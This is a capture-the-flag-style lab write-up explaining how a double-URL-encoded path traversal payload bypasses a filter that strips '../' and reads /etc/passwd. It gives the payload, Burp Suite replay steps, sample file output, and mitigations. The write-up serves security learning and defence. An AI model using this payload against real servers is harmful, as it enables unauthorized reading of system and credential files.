# Lab: File Path Traversal - Traversal Sequences Stripped with Superfluous URL-Decode

## Overview
This lab is vulnerable to a file path traversal attack. The application blocks traversal sequences such as `../`, but performs URL decoding more than once, allowing attackers to bypass the filter using double URL encoding.

## Objective
Exploit the path traversal vulnerability and retrieve the contents of the `/etc/passwd` file.

## Tools Used
- Burp Suite (Proxy, HTTP History, Repeater)
- Browser (Firefox)

## Vulnerability Explanation
The application loads image files using requests such as:

```bash
/image?filename=22.jpg
```

The server attempts to prevent path traversal attacks by stripping traversal sequences like:

```bash
../
```

However, the application performs URL decoding multiple times.

By double-encoding traversal sequences, the filter fails to detect them initially.

Payload used:

```bash
..%252f..%252f..%252fetc/passwd
```

Explanation:

- `%25` is the URL-encoded representation of `%`
- `%252f` becomes `%2f` after first decoding
- `%2f` then becomes `/` after second decoding

Final decoded payload:

```bash
../../../etc/passwd
```

This successfully bypasses the filter and retrieves sensitive files.

## Steps to Reproduce

1. Open the lab in the browser.
2. Turn ON Burp Suite Proxy.
3. Visit any product page.
4. Go to **HTTP History** in Burp Suite.
5. Locate the image request:

```bash
GET /image?filename=22.jpg
```

6. Right-click the request → **Send to Repeater**.
7. Modify the request parameter to:

```bash
GET /image?filename=..%252f..%252f..%252fetc/passwd
```

8. Click **Send**.
9. Observe the response from the server.

## Proof of Concept

The server responds with contents of the `/etc/passwd` file:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

This confirms successful exploitation of the path traversal vulnerability.

## Payload Used

```bash
..%252f..%252f..%252fetc/passwd
```

## Impact

- Unauthorized access to sensitive files
- Exposure of usernames and system information
- Increased risk of server compromise
- Potential for further exploitation

## Mitigation

- Normalize input before validation
- Avoid multiple URL decoding operations
- Use strict allowlists for file names
- Reject encoded traversal sequences
- Restrict file access to intended directories only

## Key Learnings

- Learned how double URL encoding bypasses filters
- Understood superfluous URL decode vulnerabilities
- Practiced crafting encoded traversal payloads
- Improved understanding of path normalization and decoding issues
